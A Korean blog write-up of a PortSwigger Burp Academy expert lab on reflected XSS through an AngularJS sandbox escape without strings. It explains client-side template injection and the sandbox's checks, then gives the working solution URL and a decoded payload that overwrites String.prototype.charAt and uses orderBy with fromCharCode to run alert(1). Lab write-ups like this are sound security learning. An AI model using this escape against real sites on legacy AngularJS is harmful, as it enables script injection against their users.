---
layout: post
title: "Burp Academy-XSS 취약점: Reflected XSS with AngularJS sandbox escape without strings"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XSS취약점]
toc: true
last_modified_at: 2025-03-21 05:55:00 +0900
---

# 개요
- 취약점 설명 주소: https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection
- 랩 주소: https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings
- PortSwigger Research: https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs
- 난이도: EXPERT (어려움)

# 클라이언트 템플릿 주입이란?
클라이언트 측 템플릿 주입 취약점은 클라이언트 측 템플릿 프레임워크를 사용하는 애플리케이션이 웹 페이지에 사용자 입력을 동적으로 임베드할 때 발생한다. 페이지를 렌더링할 때 **프레임워크는 템플릿 표현식을 스캔하여 발견되는 모든 표현식을 실행한다.** 공격자는 크로스 사이트 스크립팅(XSS) 공격을 시작하는 악성 템플릿 표현식을 제공하여 이를 악용할 수 있다. 

# AngularJS 샌드박스란? 
AngularJS 샌드박스는 AngularJS 템플릿 표현식에서 `window` 또는 `document` 와 같은 잠재적으로 위험한 객체에 대한 액세스를 방지하는 메커니즘이다. 또한 `__proto__` 와 같은 잠재적으로 위험한 속성에 대한 액세스도 방지한다. AngularJS 팀에서 보안 경계로 간주되지 않음에도 불구하고 더 규모가 큰 개발자 커뮤니티는 일반적으로 다르게 생각한다. 샌드박스를 우회하는 것은 처음에는 어려웠지만 보안 연구원들은 수많은 방법을 발견했다. 결과적으로 결국 AngularJS 샌드박스 기능은 AngularJS 버전 1.6에서 제거되었다. 그러나 많은 레거시 애플리케이션은 여전히 ​​이전 버전의 AngularJS를 사용하고 있으며 결과적으로 취약할 수 있다.

# AngularJS 샌드박스는 어떻게 동작하는가? 
샌드박스는 표현식을 구문 분석하고, JavaScript를 다시 작성한 다음, 다양한 함수를 사용하여 다시 작성된 코드에 위험한 객체가 포함되어 있는지 테스트한다. 예를 들어, 함수 `ensureSafeObject()` 는 주어진 객체가 자기자신을 참조하는지 확인한다. 이는 `window` 객체를 탐지하는 한 가지 방법이다. `Function` 생성자도 거의 같은 방식으로 생성자 속성이 자기자신을 참조하는지 확인하여 탐지된다.

`ensureSafeMemberName()` 함수는 객체의 각 속성의 액세스를 확인하고, `__proto__`나 ` __lookupGetter__`와 같은 위험한 속성이 포함되어 있으면 객체를 차단한다. `ensureSafeFunction()` 함수는 `call()`, `apply()`, `bind()`, `constructor()`함수가 호출되는 것을 방지한다. 

[이 fiddle](https://jsfiddle.net/2zs2yv7o/1/)을 방문하여 `angular.js` 파일의 13275번째 줄에 중단점을 설정하면 샌드박스가 작동하는 것을 직접 볼 수 있다. 변수 `fnString`은 다시 작성된 코드를 포함하고 있으므로, AgularJS가 코드를 어떻게 변환하는지 살펴볼 수 있다.


# AngularJS 샌드박스 이스케이프(탈출)는 어떻게 동작하는가? 
샌드박스 이스케이프는 샌드박스를 속여 악성 표현이 양성이라고 생각하게 하는 것을 포함한다. 가장 잘 알려진 이스케이프는 전역 표현식안에서 수정된 `charAt()` 함수를 사용한다. 

```js
'a'.constructor.prototype.charAt=[].join
```

처음 발견되었을 때 AngularJS는 이 수정을 막지 못했다. 이 공격은 `[].join` 메서드를 사용하여 함수를 덮어쓰는 방식으로 작동하는데, 그러면 `charAt()` 함수가 특정 단일 문자가 아니라 함수에 전송된 모든 문자를 반환한다. AngularJS의 `isIdent()` 함수의 로직으로 인해 단일 문자라고 생각하는 것을 여러 문자와 비교한다. 단일 문자는 항상 여러 문자보다 작으므로 함수 `isIdent()` 는 다음 예에서 볼 수 있듯이 항상 true를 반환한다.

```js
isIdent = function(ch) {
    return ('a' <= ch && ch <= 'z' || 'A' <= ch && ch <= 'Z' || '_' === ch || ch === '$');
}
isIdent('x9=9a9l9e9r9t9(919)')
```

`isIdent()` 함수가 속아 넘어간 후에는 악성 JavaScript를 주입할 수 있다. 예를 들어, AngularJS가 모든 문자를 식별자로 취급하기 때문에  `$eval('x=alert(1)')` 와 같은 표현식이 허용된다. `charAt()` 함수를 덮어쓰면 샌드박스 코드가 실행된 후에만 효과가 발생하므로 AngularJS의 `$eval()` 함수를 사용해야 할 필요가 있다. 그러면 이 기술을 사용하여 샌드박스를 우회하고 임의의 JavaScript 실행을 허용할 수 있다. PortSwigger Research는 [AngularJS 샌드박스를 여러 번 종합적으로 망가뜨렸다](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs).



# 랩 개요
- 이 랩은 AngularJS를 특이한 방식으로 사용한다. 해당 `$eval`함수를 사용할 수 없고 AngularJS에서 어떤 문자열도 사용할 수 없다.
- 랩을 풀려면, XSS공격을 수행하여 샌드박스를 벗어나 `$eval` 함수를 사용하지 않고 alert창을 실행하면 된다. 

```
This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.

To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function.
```

# 풀이 
다음 URL에 접근하면 랩이 풀린다. 

https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1


다음과 같은 결과가 나타나고 alert창이 뜬다.

![](/images/burp-academy-xss-28-1.png)

랩이 풀렸다. 

![](/images/burp-academy-xss-28-success.png)

# 분석

exploit을 분석해보자. URL디코딩한 페이로드는 다음과 같다. 

```
toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

1. 먼저 이 exploit은 따옴표없이 문자열을 만들기 위해 `toString()` 함수를 사용한다. 
2. 그 후에 `String` 의 프로토타입을 얻어 모든 문자열에 적용되는 `charAt`함수를 덮어쓴다(overwrite). 이 것이 AngularJS의 샌드박스를 부순다. 
3. 다음으로, 문자 코드를 포함한 배열이 `orderBy`필터에 전달된다. 그런 다음 다시 `toString()`을 사용하여 문자열과 `String` 생성자 속성을 만들어 필터에 대한 인수를 설정한다. 
4. 마지막으로 `fromCharCode` 메서드를 사용하여 문자 코드를 되어 있는 페이로드를 `x=alert(1)` 문자열로 변환한다. `charAt` 함수가 덮어씌워졌기 때문에 AngularJS는 일반적으로 허용하지 않는 이 코드를 허용한다.

AngularJS를 잘 모르기 때문에 완벽히 이해하지는 못했다. 

※ 나는 개발자 시절에는 vue.js를 사용했으므로 어느정도는 알고 있지만 AngularJS는 전혀 모른다. 2025년 4월기준으로 살펴보면 프론트엔드 도구 전쟁의 승자는 React로 보인다. 가장 인기가 많다. 배운다면 React겠다. 

※ 요새 많은 보이는 Next.js 는 React 라이브러리를 기반으로 개발된 프레임워크다. Next.js는 서버 사이드 렌더링, 정적 사이트 생성, API 개발에 대한 쉬운 솔루션을 제공하는 데 중점을 둔다. 